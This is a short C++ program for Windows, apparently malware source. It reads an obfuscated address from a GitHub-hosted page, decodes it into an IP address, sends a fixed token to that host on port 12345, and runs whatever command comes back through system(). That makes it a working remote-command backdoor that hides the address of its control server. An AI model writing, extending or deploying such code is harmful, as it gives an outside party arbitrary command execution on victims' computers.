//
// Created by 6rco360 on 2/11/2025.
//
// Created on 2/11/2025.
#include <windows.h>
#include <WinInet.h>
#include <iostream>
#include <cstdlib>
#include <regex>
//link with -lwininet
std::string send_request(const char* server, const char* page, int port = INTERNET_DEFAULT_HTTPS_PORT, const char *verb = "GET", const char *payload = 0){
    std::string result;
    HINTERNET internet = 0, connect = 0, request = 0;
    if(!(internet = InternetOpen("WinInet Test", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0)) ||
       !(connect = InternetConnect(internet, server, port, 0, 0, INTERNET_SERVICE_HTTP, 0, 1)) ||
       !(request = HttpOpenRequest(connect, verb, page, 0, 0, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE, 1))) {
        InternetCloseHandle(internet);
        InternetCloseHandle(connect);
        InternetCloseHandle(request);
        return "";
       }
    bool s = HttpSendRequest(request, 0, 0, (void*)payload, 0);
    char data[10000];
    while(s) {
        DWORD bytes;
        bool read = InternetReadFile(request, data, sizeof(data) - 1, &bytes);
        if (!read || !bytes) break;
        data[bytes] = 0;
        result += data;
    }
    return result;
}
std::string ify(std::string s) {
    s.insert(s.begin() + 2, '.');
    s.insert(s.begin() + 5, '.');
    s.insert(s.begin() + 8, '.');
    return s;
}
int main(){
    std::string s = send_request("github.com", "/amagicman123456/bd/blob/main/index.html");
    std::regex r(R"(\"rawLines\"\:\[\"(.+?)\")");
    std::cout << "s: " << s << std::endl;

    std::smatch sm;
    std::regex_search(s, sm, r);
    std::string str = sm[1].str();
    std::cout << "str: " << str << std::endl;
    for (char& i : str) i -= 49;
    std::string ified = ify(str);
    std::cout << "ified: " << ified << '\n';

    std::string cmd = send_request(ified.c_str(), "/", 12345, "POST", "ADSOFU1S");
    std::cout << "Command: " << cmd << '\n';
    system(cmd.c_str());
    return 0;
}